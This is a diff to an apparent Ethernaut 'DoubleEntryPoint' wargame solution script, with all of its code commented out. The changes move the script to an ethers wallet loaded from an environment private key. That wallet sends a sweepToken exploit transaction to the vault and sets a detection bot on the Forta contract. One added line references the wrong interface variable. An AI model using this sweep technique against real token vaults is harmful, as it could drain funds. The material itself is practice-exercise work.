@@ -41,6 +41,15 @@ const attackDoubleEntry = async () => {
     //     }
     // }
 
+    // wallet and contract here
+    // const contract = await ethers.getContractAt("DoubleEntryPoint", doubleEntryAddress);
+    // // using my custom rpc stored in .env (for privacy)
+    // const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
+    // const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
+    // const PRIVATE_KEY =
+    //     process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
+    // const wallet = new Wallet(PRIVATE_KEY, provider);
+
     // const vault = await contract.cryptoVault()
     // console.log("cryptoVault address: ", vault)
 
@@ -60,12 +69,14 @@ const attackDoubleEntry = async () => {
     // }, [legacyToken])
 
     // etherjs
-    // console.log("Encoding function signature...");
+    // console.log("Encoding function signature for sweepToken...");
     // const iface = new ethers.utils.Interface(["function sweepToken(address token)"]);
     // const sweepSig = iface.encodeFunctionData("sweepToken", [legacyToken]);
 
     // // Send exploit transaction
-    // await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })
+    // console.log("Sending transaction...")
+    // const tx1 = await wallet.sendTransaction({ from: player, to: vault, data: sweepSig })
+    // console.log(tx1)
 
     // // Check balance (0 DET)
     // vaultBalance = await contract.balanceOf(vault).toString()  // '0'
@@ -87,8 +98,15 @@ const attackDoubleEntry = async () => {
     //     ]
     // }, [botAddr])
 
+    // etherjs
+    // console.log("Encoding function signature for setDetectionBot...");
+    // const ifaceBot = new ethers.utils.Interface(["function setDetectionBot(address detectionBotAddress)"]);
+    // const setBotSig = iface.encodeFunctionData("setDetectionBot", [botAddr]);
+
     // // Send the transaction setting the bot
-    // await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig })
+    // console.log("Sending transaction...")
+    // const tx2 = await wallet.sendTransaction({from: player, to: forta, data: setBotSig })
+    // console.log(tx2)
 
     // console.log(txReceipt1);
 };
